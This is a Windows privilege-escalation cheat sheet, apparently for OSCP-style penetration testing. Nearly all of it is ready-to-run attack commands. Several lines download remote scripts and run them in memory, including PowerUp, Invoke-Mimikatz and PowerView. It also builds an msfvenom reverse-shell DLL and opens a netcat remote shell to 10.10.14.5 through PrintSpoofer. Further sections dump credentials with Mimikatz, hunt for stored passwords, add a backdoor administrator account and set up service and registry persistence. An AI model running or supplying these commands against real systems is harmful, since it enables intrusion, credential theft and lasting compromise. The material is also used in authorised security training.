# Windows Privilege Escalation

## Display current user and all privileges
```powershell
whoami /all
```

## Display current user's group memberships
```powershell
whoami /groups
whoami /priv
```

## List all local users
```powershell
net user
Get-LocalUser
```

## Get details for specific user
```powershell
net user administrator
net user %username%
```

## List all local groups
```powershell
net localgroup
Get-LocalGroup
```

## List members of Administrators group
```powershell
net localgroup Administrators
Get-LocalGroupMember Administrators
```

## List members of Remote Desktop Users group
```powershell
net localgroup "Remote Desktop Users"
Get-LocalGroupMember "Remote Desktop Users"
```

## List members of Backup Operators group
```powershell
net localgroup "Backup Operators"
Get-LocalGroupMember "Backup Operators"
```

## Determine if running in PowerShell or CMD
```powershell
(dir2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## Display system information
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
```

## Display network configuration
```powershell
ipconfig /all
```

## Show routing table
```powershell
route print
```

## List active network connections
```powershell
netstat -ano
```

## Search for plaintext secrets in user files
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *password*,*cred*,*vnc* -Recurse -Force -ErrorAction SilentlyContinue
```

## List installed programs from 32-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List installed programs from 64-bit registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List all running processes
```powershell
Get-Process
tasklist /v
```

## List processes with command line arguments
```powershell
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine
wmic process get name,processid,commandline
```

## Display current user privileges
```powershell
whoami /priv
```

## Get PowerShell command history
```powershell
Get-History
```

## Get PSReadline history file path
```powershell
(Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath
```

## Find PSReadline history for all users
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
```

## Download and run WinPEAS executable
```powershell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEAS.exe
.\winPEAS.exe
.\winPEAS.exe | Tee-Object -FilePath "winpeas_output.txt"
```

## Download and run WinPEAS PowerShell script
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
Invoke-winPEAS
```

## Download and run PowerUp.ps1
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

## Copy PowerUp from Kali and import
```powershell
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

## Run Windows Exploit Suggester on Kali
```bash
systeminfo > systeminfo.txt
python3 /opt/wesng/wes.py systeminfo.txt
```

## List all services
```powershell
sc query state=all
Get-Service
```

## Check service permissions with icacls
```powershell
icacls "C:\Program Files\Service\service.exe"
```

## List services with full path
```powershell
Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,displayname,pathname,startmode
```

## Find unquoted service paths with spaces
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Find unquoted service paths with PowerShell
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
```

## Find unquoted services with PowerUp
```powershell
Get-UnquotedService
Write-ServiceBinary
```

## Find modifiable service binaries with PowerUp
```powershell
Get-ModifiableServiceFile
```

## Replace service binary with malicious executable
```cmd
icacls "C:\Program Files\Service\service.exe"
copy evil.exe "C:\Program Files\Service\service.exe"
```

## Stop and start service for exploitation
```cmd
net stop ServiceName
net start ServiceName
sc stop ServiceName
sc start ServiceName
```

## Create malicious DLL with msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
```

## List all scheduled tasks
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

## Find writable scheduled task binaries
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Check for AlwaysInstallElevated registry keys
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Create MSI payload for AlwaysInstallElevated
```bash
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
```

## Install malicious MSI silently
```cmd
msiexec /quiet /qn /i evil.msi
```

## Check registry autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Check startup folder permissions
```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

## Search for password files
```cmd
dir /s *password*
dir /s *cred*
dir /s *vnc*
dir /s *.config
```

## Search for VNC passwords in registry
```cmd
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server
```

## Check for auto-login credentials in registry
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## List saved credentials
```cmd
cmdkey /list
```

## Run Mimikatz to extract logon passwords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## Run Mimikatz to extract WDigest credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

## Run Mimikatz to extract MSV credentials
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
```

## Run Mimikatz to dump cached credentials
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

## Run Mimikatz to dump SAM hashes
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

## Run Invoke-Mimikatz PowerShell version
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

## Check for SeImpersonatePrivilege or SeAssignPrimaryToken
```cmd
whoami /priv | findstr "SeImpersonate"
whoami /priv | findstr "SeAssignPrimaryToken"
```

## Run SweetPotato for privilege escalation
```cmd
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

## Run PrintSpoofer for Windows Server 2016/2019
```cmd
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe 10.10.14.5 4444 -e cmd.exe"
```

## Run JuicyPotato for older Windows versions
```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *
```

## Download PowerView for AD enumeration
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

## Get domain information with PowerView
```powershell
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

## Run SharpHound for BloodHound data collection
```cmd
.\SharpHound.exe -c All
.\SharpHound.exe -c All -d domain.local
```

## Run bloodhound-python from attacker machine
```bash
bloodhound-python -d domain.local -u username -p password -gc $IP -c all
```

## Add new local administrator user
```cmd
net user hacker Password123! /add
net localgroup administrators hacker /add
```

## Create service backdoor
```cmd
sc create evil binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc start evil
```

## Add registry persistence
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\temp\backdoor.exe"
```

---

## Methodology

### Enumeration Priority
1. Run automated tools first (WinPEAS, PowerUp)
2. Check current user privileges (whoami /priv)
3. Look for SeImpersonatePrivilege or SeAssignPrimaryToken
4. Enumerate services for weak permissions
5. Search for credentials in files and registry
6. Check for unquoted service paths
7. Look for AlwaysInstallElevated registry keys

### High Priority Privilege Escalation Vectors

**Immediate Win (Check First):**
- SeImpersonatePrivilege enabled (use SweetPotato/PrintSpoofer)
- SeAssignPrimaryToken enabled (use SweetPotato/PrintSpoofer)
- SeBackupPrivilege enabled
- SeLoadDriver enabled
- SeDebug enabled
- AlwaysInstallElevated registry keys set

**Common Service Exploits:**
- Unquoted service paths with write permissions
- Service binary writable by current user
- Service running as SYSTEM with weak permissions
- DLL hijacking opportunities

**Credential Hunting:**
- PowerShell history files
- Registry credentials (VNC, auto-login)
- Configuration files with passwords
- Saved credentials (cmdkey /list)

**Other Vectors:**
- Writable scheduled tasks running as SYSTEM
- Registry autoruns with write access
- Group Policy Preferences passwords

### Token Impersonation Tools

**SweetPotato (Recommended - Most Compatible):**
- Works on Windows 7 through Windows 11
- Works on Server 2008 through Server 2022
- Most reliable for OSCP

**PrintSpoofer (Windows Server 2016/2019):**
- More stable on newer Windows Server versions
- Requires Print Spooler service running

**JuicyPotato (Older Windows):**
- Works on Windows 7, 8, Server 2008, Server 2012
- Requires specific CLSID for OS version

### Windows Privilege Escalation Checklist

**Phase 1 - Automated Enumeration:**
- Run WinPEAS
- Run PowerUp.ps1
- Run Windows Exploit Suggester (on Kali)

**Phase 2 - Token/Privilege Checks:**
- Check whoami /priv for dangerous privileges
- If SeImpersonatePrivilege: Use SweetPotato
- If SeBackupPrivilege: Backup SAM/SYSTEM hives

**Phase 3 - Service Enumeration:**
- Check for unquoted service paths
- Check service binary permissions
- Check for weak service permissions

**Phase 4 - Credential Hunting:**
- Search PowerShell history
- Search registry for credentials
- Search filesystem for config files
- Check for saved credentials

**Phase 5 - Last Resort:**
- Check for kernel exploits (risky)
- Look for DLL hijacking opportunities

### Common Privilege Groups

**High Value Groups:**
- Administrators (full system access)
- Backup Operators (can backup/restore files)
- Remote Desktop Users (RDP access)
- Remote Management Users (WinRM access)

### Kernel Exploits (Last Resort)

Only use kernel exploits as a last resort due to system crash risk:
- MS16-032 (Secondary Logon Handle)
- MS17-010 (EternalBlue)
- CVE-2020-0796 (SMBGhost)
- CVE-2021-1675 (PrintNightmare)

Always check systeminfo output against Windows Exploit Suggester.

### PowerShell Execution Policy Bypass

If PowerShell execution is restricted:
```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
```

### Useful PowerShell Tools

**PowerUp.ps1** - Privilege escalation enumeration
**PowerView.ps1** - Active Directory enumeration
**Sherlock.ps1** - Exploit suggester
**Invoke-Mimikatz.ps1** - Credential dumping

### Resources
- PowerSploit Framework: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng WinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings Windows: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS Project: https://lolbas-project.github.io/
- OSCP Secret Sauce (SweetPotato, Mimikatz): https://eins.li/posts/oscp-secret-sauce/
